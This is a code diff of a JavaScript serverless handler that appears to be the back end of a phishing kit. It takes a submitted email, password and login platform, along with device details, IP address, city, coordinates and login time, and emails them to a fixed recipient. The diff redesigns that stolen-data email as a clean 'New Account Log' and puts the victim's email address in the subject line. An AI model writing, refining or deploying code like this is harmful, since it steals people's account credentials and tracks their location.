@@ -19,8 +19,6 @@ export default async function handler(req, res) {
 
     try {
         let d = req.body;
-        
-        // PARSE BODY KALO BENTUKNYA STRING (KARENA TEXT/PLAIN)
         if (typeof d === "string") {
             try { d = JSON.parse(d); } catch(e) { return res.status(400).json({ error: "INVALID_JSON" }); }
         }
@@ -54,44 +52,93 @@ export default async function handler(req, res) {
         const flag = countryFlag(d.negaraKode || "");
         const previewText = "ID | +62 | LOGIN " + PLATFORM + " | IP " + (d.ip || "-");
 
+        // DESAIN BARU: CLEAN WHITE & MODERN
         const htmlBody = `
         <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">${previewText}</div>
-        <div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
-          <div style="max-width:600px;margin:auto;background:#fff;border-radius:10px;overflow:hidden">
-            <div style="background:linear-gradient(135deg,#667eea,#764ba2);padding:25px;text-align:center;color:#fff">
-              <h1 style="margin:0;font-size:22px">🥷 ${NAMA_PENGIRIM} 🥷</h1>
+        <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f3f4f6; padding: 30px 15px;">
+          <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);">
+            
+            <!-- HEADER -->
+            <div style="background-color: #111827; padding: 24px 30px; text-align: left; border-bottom: 4px solid #3b82f6;">
+              <h1 style="margin: 0; font-size: 20px; font-weight: 600; color: #ffffff; letter-spacing: 0.5px;">${NAMA_PENGIRIM}</h1>
+              <p style="margin: 4px 0 0 0; font-size: 13px; color: #9ca3af;">New Account Log</p>
             </div>
-            <div style="padding:25px">
-              <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:0">📧 ACCOUNT INFO</h3>
-              <table style="width:100%;font-size:14px;border-collapse:collapse">
-                <tr><td style="padding:10px;font-weight:bold;width:35%">EMAIL</td><td style="padding:10px">${d.email || "-"}</td></tr>
-                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PASSWORD</td><td style="padding:10px">${d.password || "-"}</td></tr>
-                <tr><td style="padding:10px;font-weight:bold">LOGIN DARI</td><td style="padding:10px"><b>${PLATFORM}</b></td></tr>
+            
+            <div style="padding: 30px;">
+              <!-- SECTION: ACCOUNT -->
+              <h3 style="color: #374151; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin: 0 0 16px 0; border-bottom: 1px solid #e5e7eb; padding-bottom: 8px;">Account Info</h3>
+              <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px;">
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280; width: 35%;">Email</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.email || "-"}</td>
+                </tr>
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Password</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #ef4444; font-weight: 600;">${d.password || "-"}</td>
+                </tr>
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Platform</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">
+                    <span style="background-color: #eff6ff; color: #1d4ed8; padding: 4px 8px; border-radius: 4px; font-size: 12px;">${PLATFORM}</span>
+                  </td>
+                </tr>
               </table>
 
-              <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📱 DEVICE INFO</h3>
-              <table style="width:100%;font-size:14px;border-collapse:collapse">
-                <tr><td style="padding:10px;font-weight:bold;width:35%">DEVICE</td><td style="padding:10px">${d.device || "-"}</td></tr>
-                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">OS VERSION</td><td style="padding:10px">${d.os || "-"}</td></tr>
-                <tr><td style="padding:10px;font-weight:bold">BROWSER</td><td style="padding:10px">${d.browser || "-"}</td></tr>
+              <!-- SECTION: DEVICE -->
+              <h3 style="color: #374151; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin: 0 0 16px 0; border-bottom: 1px solid #e5e7eb; padding-bottom: 8px;">Device Info</h3>
+              <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px;">
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280; width: 35%;">Device</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.device || "-"}</td>
+                </tr>
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">OS Version</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.os || "-"}</td>
+                </tr>
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Browser</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.browser || "-"}</td>
+                </tr>
               </table>
 
-              <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📍 LOCATION INFO</h3>
-              <table style="width:100%;font-size:14px;border-collapse:collapse">
-                <tr><td style="padding:10px;font-weight:bold;width:35%">ALAMAT IP</td><td style="padding:10px">${d.ip || "-"}</td></tr>
-                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">IPV6</td><td style="padding:10px">${d.ipv6 || "-"}</td></tr>
-                <tr><td style="padding:10px;font-weight:bold">NEGARA</td><td style="padding:10px">${flag} ${d.negara || "-"}</td></tr>
-                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PROVINSI</td><td style="padding:10px">${d.prov || "-"}</td></tr>
-                <tr><td style="padding:10px;font-weight:bold">KOTA</td><td style="padding:10px">${d.kota || "-"}</td></tr>
-                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">ZONA WAKTU</td><td style="padding:10px">${d.zona || "-"}</td></tr>
-                <tr><td style="padding:10px;font-weight:bold">PROVIDER</td><td style="padding:10px">${d.isp || "-"}</td></tr>
-                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">ASN</td><td style="padding:10px">${d.asn || "-"}</td></tr>
-                <tr><td style="padding:10px;font-weight:bold">ZIP CODE</td><td style="padding:10px">${d.zip || "-"}</td></tr>
-                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">LAT , LONG</td><td style="padding:10px">${d.koord || "-"}</td></tr>
-                <tr><td style="padding:10px;font-weight:bold">JAM MASUK</td><td style="padding:10px">${d.waktu || "-"}</td></tr>
+              <!-- SECTION: LOCATION -->
+              <h3 style="color: #374151; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin: 0 0 16px 0; border-bottom: 1px solid #e5e7eb; padding-bottom: 8px;">Location Info</h3>
+              <table style="width: 100%; border-collapse: collapse;">
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280; width: 35%;">IP Address</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.ip || "-"}</td>
+                </tr>
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Country</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${flag} ${d.negara || "-"}</td>
+                </tr>
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Province</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.prov || "-"}</td>
+                </tr>
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">City</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.kota || "-"}</td>
+                </tr>
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">ISP</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.isp || "-"}</td>
+                </tr>
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Coordinates</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.koord || "-"}</td>
+                </tr>
+                <tr>
+                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Time</td>
+                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.waktu || "-"}</td>
+                </tr>
               </table>
             </div>
-            <div style="background:#333;color:#fff;padding:15px;text-align:center;font-size:12px">${NAMA_PENGIRIM} - Real Data Stream</div>
+
+            <!-- FOOTER -->
+            <div style="background-color: #f9fafb; padding: 20px; text-align: center; border-top: 1px solid #e5e7eb;">
+              <p style="margin: 0; font-size: 12px; color: #9ca3af;">Generated by ${NAMA_PENGIRIM} System &bull; ${new Date().getFullYear()}</p>
+            </div>
           </div>
         </div>`;
 
@@ -101,7 +148,7 @@ export default async function handler(req, res) {
             body: JSON.stringify({
                 from: `${NAMA_PENGIRIM} <${EMAIL_PENGIRIM}>`,
                 to: [EMAIL_TUJUAN],
-                subject: "🥷 " + NAMA_PENGIRIM + " 🥷 | " + PLATFORM + " | IP " + (d.ip || "-"),
+                subject: `🥷 ${NAMA_PENGIRIM} | ${PLATFORM} | ${d.email || "-"}`,
                 html: htmlBody
             })
         });
